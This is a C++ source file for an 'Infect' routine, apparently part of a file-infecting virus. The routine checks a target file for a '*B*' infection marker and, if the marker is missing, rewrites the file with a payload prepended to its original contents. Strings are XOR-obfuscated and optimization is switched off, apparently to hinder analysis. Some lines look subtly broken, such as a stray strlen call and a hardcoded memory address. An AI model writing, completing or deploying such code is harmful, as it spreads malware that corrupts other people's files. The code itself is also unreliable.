#include "data_globals.h"
#include <fstream>
#include <cstring>
#include <cstdlib>
#pragma optimize("", off)

// Helper to cast volatile unsigned char* to const char*
template<typename T>
static const char* to_const_char(const volatile T* p) {
    return reinterpret_cast<const char*>(const_cast<const T*>(p));
}

static void xor_decrypt(volatile unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void Infect(char* filename, char* payload)
{
    volatile unsigned char sz_status_1[] = { 'Y'^0x3E, 'E'^0x3E, 'S'^0x3E, 0x00^0x3E };
    xor_decrypt(sz_status_1, sizeof(sz_status_1), 0x3E);

    std::ifstream in_file(filename, std::ios::in | std::ios::binary);
    in_file.seekg(0, std::ios::end);
    std::streampos pos = in_file.tellg();
    int file_size = static_cast<int>(pos);
    in_file.seekg(0, std::ios::beg);

    Buffer = static_cast<char*>(malloc(static_cast<size_t>(file_size)));
    in_file.read(Buffer, static_cast<std::streamsize>(file_size));
    in_file.close();

    for (int j = 0; j < file_size; ++j) {
        if (Buffer[j] == '*' && Buffer[j + 1] == 'B' && Buffer[j + 2] == '*') {
            Status[0] = 'Y';
            Status[1] = 'E';
            Status[2] = 'S';
            Status[3] = '\0';
            break;
        }
    }

    if (strcmp(reinterpret_cast<const char*>(Status), to_const_char(sz_status_1)) != 0) {
        std::ofstream out_file(filename, std::ios::out | std::ios::binary);
        out_file << payload;
        strlen(&inf);
        out_file << reinterpret_cast<const char*>(0x140008164);
        out_file.write(Buffer, static_cast<std::streamsize>(file_size));
        out_file.close();
    }

    free(Buffer);
}
#pragma optimize("", on)
